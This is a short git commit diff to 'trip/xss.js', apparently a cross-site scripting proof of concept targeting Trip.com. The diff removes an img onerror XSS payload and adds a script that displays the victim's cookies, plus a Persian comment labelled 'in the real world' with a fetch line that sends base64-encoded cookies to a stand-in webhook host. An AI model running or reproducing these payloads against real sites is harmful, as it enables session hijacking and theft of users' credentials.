4363d3e4c29dd84e99a8d33928f4098546b36a80
Ferhadfaal <115871176+Ferhadfaal@users.noreply.github.com>
2026-04-12 20:25:29 +0300

    Update xss.js

--- trip/xss.js
+++ trip/xss.js
@@ -1,1 +1,2 @@
-</script><img src=x onerror=alert("HAKKED")> 
+alert("XSS Triggered on Trip.com!\n\nYour Cookie:\n" + document.cookie);
+// در دنیای واقعی: fetch('https://your-webhook.site?c=' + btoa(document.cookie));
